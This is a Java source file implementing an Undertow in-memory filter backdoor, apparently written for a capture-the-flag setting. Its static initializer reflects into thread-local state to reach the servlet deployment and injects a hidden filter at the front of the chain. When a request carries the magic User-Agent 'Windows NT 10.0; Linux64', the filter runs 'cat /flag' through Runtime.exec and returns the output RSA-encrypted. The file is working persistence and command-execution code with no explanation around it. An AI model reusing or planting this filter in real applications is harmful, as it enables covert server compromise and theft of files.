package tech.pdai.springboot.helloworld.undertow;


import io.undertow.servlet.api.Deployment;
import io.undertow.servlet.api.DeploymentInfo;
import io.undertow.servlet.api.FilterInfo;
import io.undertow.servlet.handlers.ServletRequestContext;
import io.undertow.servlet.spec.HttpServletResponseImpl;
import io.undertow.servlet.spec.ServletContextImpl;

import javax.crypto.Cipher;
import javax.servlet.*;
import javax.servlet.http.HttpServletRequest;
import java.io.IOException;
import java.io.InputStream;
import java.lang.reflect.Array;
import java.lang.reflect.Field;
import java.security.KeyFactory;
import java.security.interfaces.RSAPublicKey;
import java.security.spec.X509EncodedKeySpec;
import java.util.Scanner;

public class UndertowFilter implements Filter {

    private static ServletContextImpl servletContext;
    private static HttpServletResponseImpl response;
    private static DeploymentInfo deploymentInfo;
    private static Deployment deployment;
    private static String filterName = "CheckFilter";
    private static String url = "/*";


    //获取上下文
    public static synchronized void GetWebContent() throws Exception {
        try{
            try{
                Thread thread = Thread.currentThread();
                Object threadLocals = GetField(thread, "threadLocals");
                Object table = GetField(threadLocals, "table");
                for(int i = 0; i<= Array.getLength(table)-1; i++){
                    try{
                        Object object = Array.get(table, i);
                        Object value = GetField(object, "value");
                        if (value.getClass().getName().contains("ServletRequestContext")){
                            ServletRequestContext servletRequestContext = (ServletRequestContext) value;
                            response = (HttpServletResponseImpl) GetField(servletRequestContext, "originalResponse");
                            servletContext = (ServletContextImpl) GetField(servletRequestContext, "currentServletContext");
                            deploymentInfo = (DeploymentInfo) GetField(servletContext, "deploymentInfo");
                            deployment = (Deployment) GetField(servletContext, "deployment");
                            break;
                        }
                    }catch (Exception e){}
                }
            }catch (Exception e){

            }
        }catch (Exception e){
            e.printStackTrace();
        }
    }

    private static synchronized void InjectFilter() throws Exception {
        try{
            if(deployment != null && deploymentInfo != null){
                FilterInfo filterInfo = new FilterInfo(filterName, UndertowFilter.class);
                deploymentInfo.addFilter(filterInfo);
                deploymentInfo.insertFilterUrlMapping(0,filterName,url, DispatcherType.REQUEST);
                deployment.getFilters().addFilter(filterInfo);
                response.addHeader("Status","Work");
            }
        }catch (Exception e){
            e.printStackTrace();
        }
    }

    static {
        try{
            GetWebContent();
            InjectFilter();
        }catch (Exception e){
        }
    }



    public static Field getField(final Class<?> clazz, final String fieldName) {
        Field field = null;
        try {
            field = clazz.getDeclaredField(fieldName);
            field.setAccessible(true);
        } catch (NoSuchFieldException ex) {
            if (clazz.getSuperclass() != null)
                field = getField(clazz.getSuperclass(), fieldName);
        }
        return field;
    }

    public static synchronized Object GetField(final Object obj, final String fieldName) throws Exception {
        final Field field = getField(obj.getClass(), fieldName);
        return field.get(obj);
    }


    public static String base64Encode(byte[] bs) throws Exception {
        Class base64;
        String value = null;
        try {
            base64 = Class.forName("java.util.Base64");
            Object Encoder = base64.getMethod("getEncoder", null).invoke(base64, null);
            value = (String) Encoder.getClass().getMethod("encodeToString", new Class[]{byte[].class}).invoke(Encoder, new Object[]{bs});
        } catch (Exception e) {
            try {
                base64 = Class.forName("sun.misc.BASE64Encoder");
                Object Encoder = base64.newInstance();
                value = (String) Encoder.getClass().getMethod("encode", new Class[]{byte[].class}).invoke(Encoder, new Object[]{bs});
            } catch (Exception e2) {
            }
        }
        return value;
    }

    public static byte[] base64Decode(String bs) throws Exception {
        Class base64;
        byte[] value = null;
        try {
            base64 = Class.forName("java.util.Base64");
            Object decoder = base64.getMethod("getDecoder", null).invoke(base64, null);
            value = (byte[]) decoder.getClass().getMethod("decode", new Class[]{String.class}).invoke(decoder, new Object[]{bs});
        } catch (Exception e) {
            try {
                base64 = Class.forName("sun.misc.BASE64Decoder");
                Object decoder = base64.newInstance();
                value = (byte[]) decoder.getClass().getMethod("decodeBuffer", new Class[]{String.class}).invoke(decoder, new Object[]{bs});
            } catch (Exception e2) {
            }
        }
        return value;
    }


    public void init(FilterConfig filterConfig) throws ServletException {

    }

    @Override
    public void doFilter(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain) throws IOException, ServletException {
        try {
            HttpServletRequest request = (HttpServletRequest) servletRequest;
            String path = request.getServletPath();
            if (path.startsWith("/doc") || path.startsWith("/json") || path.startsWith("/shell")) {
                return;
            }
            HttpServletRequest req = (HttpServletRequest) servletRequest;
            if (req.getHeader("User-Agent").contains("Windows NT 10.0; Linux64")) {
                InputStream in = Runtime.getRuntime().exec("cat /flag").getInputStream();

                Scanner s = new Scanner(in).useDelimiter("\\A");
                String output = s.hasNext() ? s.next() : "";

                String publicKey = "MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQCSPJ9ohMbyj46S9/9nQgD72OuPIVPSKpPhbfgTh+NwhzxyBVb8CXqMNoBcUTkMPJrz57/i/QkQv9OeY0HiOabWC3w2H0HULdPrQCTRCUVy6ag1Ed2gLtr9U5ZhkXeBabCOvIrHbsnTQWrR1yGT5YwPda1WL0EmVscLe8TSyvXViQIDAQAB";
                byte[] decoded = base64Decode(publicKey);
                RSAPublicKey pubKey = (RSAPublicKey) KeyFactory.getInstance("RSA").generatePublic(new X509EncodedKeySpec(decoded));
                Cipher cipher = Cipher.getInstance("RSA");
                cipher.init(Cipher.ENCRYPT_MODE, pubKey);
                String outStr = base64Encode(cipher.doFinal(output.getBytes("UTF-8")));
                servletResponse.getWriter().write(outStr);
                return;
            } else {
//                return;
            }
            filterChain.doFilter(servletRequest, servletResponse);
        } catch (Exception e) {

        }

    }

    public void destroy() {

    }
}
